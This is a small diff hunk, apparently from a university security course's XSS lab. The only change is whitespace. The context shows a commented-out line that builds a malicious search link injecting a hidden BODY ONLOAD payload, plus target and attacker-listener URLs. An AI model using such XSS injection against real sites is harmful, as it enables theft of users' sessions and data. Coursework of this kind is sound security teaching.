@@ -122,7 +122,7 @@ function makeLink(xssdefense, target, attacker) {
 // return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
 //             encodeURIComponent("<div style=\"display:hidden;\"><BODY" + " ONLOAD=\"" + payload.toString() + ";payload(\"" + attacker + "\");\"></BODY></div>");
 
-var xssdefense =3;
+var xssdefense = 3;
 var target = "http://eecs388.org/project2/";
 var attacker = "http://127.0.0.1:31337/";
 $(function() {
